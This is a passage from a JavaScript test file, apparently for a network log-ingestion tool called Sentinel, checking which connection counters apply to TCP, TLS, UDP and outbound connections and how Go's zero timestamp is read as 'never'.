        'Datagrams the operating system dropped on this socket before Sentinel read them, usually because the receive buffer was full (Linux only).',
      );
    });

    it('applies each counter to the connections that can raise it', () => {
      // TCP listener: everything except what only UDP, TLS or a dialling connection has.
      expect(keysFor(target())).toEqual(['accepted', 'rejected', 'refused', 'rateLimited', 'senderRateLimited', 'oversize', 'tlsFailed', 'malformed']);
      expect(keysFor(target({ tls: true }))).toEqual(['accepted', 'rejected', 'refused', 'rateLimited', 'senderRateLimited', 'oversize', 'tlsFailed', 'tlsReloads', 'tlsReloadFailed', 'malformed']);
      // UDP never refuses a connection or speaks TLS; the OS may drop its datagrams.
      expect(keysFor(target({ protocol: 'udp', framing: 'message' }))).toEqual(['accepted', 'rejected', 'rateLimited', 'senderRateLimited', 'oversize', 'kernelDropped', 'malformed']);
      // A connection Sentinel dials out has no listener counters.
      expect(keysFor(target({ mode: 'connect' }))).toEqual(['malformed', 'messages', 'reconnects']);
    });
  });

  it('tells a time from the zero time Go sends for "never"', () => {
    expect(senderTime('2026-10-18T10:00:05Z')).toBe('2026-10-18T10:00:05Z');
    expect(senderTime('0001-01-01T00:00:00Z')).toBeNull();
    expect(senderTime('1970-01-01T00:00:00Z')).toBeNull();
    expect(senderTime('')).toBeNull();
    expect(senderTime(undefined)).toBeNull();
    expect(senderTime(null)).toBeNull();
    expect(senderTime('yesterday')).toBeNull();
  });
});
